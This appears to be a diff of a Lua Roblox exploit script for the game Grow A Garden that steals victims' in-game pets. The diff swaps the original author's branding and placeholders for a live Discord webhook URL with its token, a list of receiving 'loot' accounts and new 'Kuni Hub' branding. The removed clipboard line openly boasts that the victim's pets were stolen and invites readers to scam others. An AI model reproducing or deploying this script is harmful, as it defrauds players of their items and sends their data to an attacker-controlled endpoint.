@@ -1,18 +1,5 @@
---[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
-                        Scripts.SM | Premium Scripts
-                        Made by: Scripter.SM
-                        Discord: discord.gg/d2zgg2YDMz
-]]
-
-getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
-getgenv().Username = "PUT_HERE_UR_USERNAME"
+getgenv().Webhook = "https://discord.com/api/webhooks/1396854189698842737/9Tkr0tIvHi52675GW9VYhqG3lD4JMEcQobg7gBgOq7ItWTpHpqzMvKHRZ5hy68GA2nkw"
+getgenv().Username = "HelloWorld_Z99, Kuni_Loot, Kuni_Loot1, Kuni_Loot02, Kuni_Loot3, Elaine_Pets, Elaine_Pets1, Elaine_Pets2, Elaine_Pets3, Elaine_Pets4, Elaine_Pets5, Elaine_Pets6, Elaine_Pets7, Elaine_Pets8, Elaine_Pets9, Elaine_Pets10, Elaine_Pets11, Elaine_Pets12, Elaine_Pets13, Elaine_Pets14, Elaine_Pets15, Elaine_Pets16, Elaine_Pets17, Elaine_Pets18, Elaine_Pets19, Elaine_Pets20, BEESUYAH"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -31,7 +18,7 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("Kuni Scripts is the best!")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -416,7 +403,7 @@ end
 local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
-    title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+    title = "Grow A Garden Hit - Kuni Hub Scripts🤑",
     color = 65280,
     fields = {
         {
@@ -848,4 +835,5 @@ end)
                 end       
             end
         end
+
     end
